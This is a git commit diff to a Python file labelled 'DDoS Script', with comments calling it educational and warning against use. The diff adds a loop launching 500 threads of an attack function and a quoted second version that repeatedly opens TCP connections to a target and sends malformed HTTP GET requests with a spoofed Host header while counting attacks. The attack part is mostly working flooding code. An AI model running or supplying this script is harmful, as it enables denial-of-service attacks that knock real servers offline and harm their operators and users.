19d1ae122751ad813f8b89297c24db98ea5ee14e
Godriele Dela Cruz <godriele11@yahoo.com>
2025-01-06 13:22:47 -0800

    Finsihed the Script, wont run it, just for educational purposes

--- app.py
+++ app.py
@@ -1,4 +1,4 @@
-# DDoS Script
+# DDoS Script - Dont Run this -> Just for educational purposes
 '''
  - What it is 
 A distributed denial of service (DDoS) attack is a cybercrime that aims to overload 
@@ -50,3 +50,47 @@ def attack():
 # The use of an infinite loop ensures that the attack continues indefinitely. This code is 
 # intended for educational purposes only and should not be used maliciously. Unauthorized 
 # use of such techniques can lead to legal consequences.
+
+# How many threads you want to run
+for i in range(500):
+    thread = threading.Thread(target=attack)
+    thread.start()
+    
+'''
+# Initialize a global counter to track the number of attacks
+attack_num = 0
+
+def attack():
+    while True:
+        # Create a new socket using IPv4 and TCP protocols
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        
+        # Connect to the target IP address and port
+        s.connect((target, port))
+        
+        # Send a malformed HTTP GET request to the target
+        s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'), (target, port))
+        
+        # Send a fake Host header to the target
+        s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, port))
+        
+        # Increment the global attack counter
+        global attack_num
+        attack_num += 1
+        
+        # Print the current number of attacks
+        print(attack_num)
+        
+        # Close the socket, ending the connection
+        s.close()
+
+# Summary:
+# This function, similar to the first version, implements a Denial of Service (DoS) attack by 
+# continuously connecting to a target server and sending malformed HTTP requests. However, 
+# this version includes a global counter `attack_num` that tracks and prints the number of 
+# attack iterations. This provides feedback on how many times the attack has been executed, 
+# which can be used for monitoring or debugging purposes. The same legal and ethical warnings 
+# apply as in the first version.
+
+'''
+    
